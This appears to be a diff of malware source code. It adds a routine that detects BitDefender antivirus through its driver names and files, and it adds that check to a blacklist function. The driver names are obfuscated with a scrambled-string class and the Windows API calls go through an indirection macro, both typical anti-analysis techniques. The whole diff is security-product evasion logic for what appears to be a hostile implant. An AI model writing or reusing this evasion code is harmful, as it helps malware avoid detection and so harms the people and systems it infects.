@@ -330,6 +330,41 @@ BOOL IsBitDefender()
 	return TRUE;
 }
 
+BOOL IsBitDefenderAVPlus()
+{
+	WIN32_FIND_DATA fdata;
+	char buffer[DLLNAMELEN];
+	HANDLE hff;
+
+	ScrambleString ss1("Iiz1zWvt.1J1"); // "bdfsfltr.sys"
+	ScrambleString ss2("8Rgp.1J1"); // "avc3.sys"
+
+	if (IsDriverRunning(ss1.get_wstr()) && IsDriverRunning(ss2.get_wstr()))
+		return TRUE;
+
+	ZeroMemory(buffer, sizeof(buffer));
+	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
+	strcat(buffer, "\\system32\\drivers\\");
+	strcat(buffer, ss1.get_str());
+
+	hff = FNC(FindFirstFileA)(buffer, &fdata);
+	if (hff == INVALID_HANDLE_VALUE)
+		return FALSE;
+	FNC(FindClose)(hff);
+
+	ZeroMemory(buffer, sizeof(buffer));
+	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
+	strcat(buffer, "\\system32\\drivers\\");
+	strcat(buffer, ss2.get_str());
+
+	hff = FNC(FindFirstFileA)(buffer, &fdata);
+	if (hff == INVALID_HANDLE_VALUE) 
+		return FALSE;
+	FNC(FindClose)(hff);
+
+	return TRUE;
+}
+
 BOOL IsBlink()
 {
 	WIN32_FIND_DATA fdata;
@@ -796,7 +831,7 @@ BOOL IsGData()
 
 BOOL IsBlackList()
 {
-	if (IsGData())
+	if (IsGData() || IsBitDefenderAVPlus())
 		return TRUE;
 	return FALSE;
 }
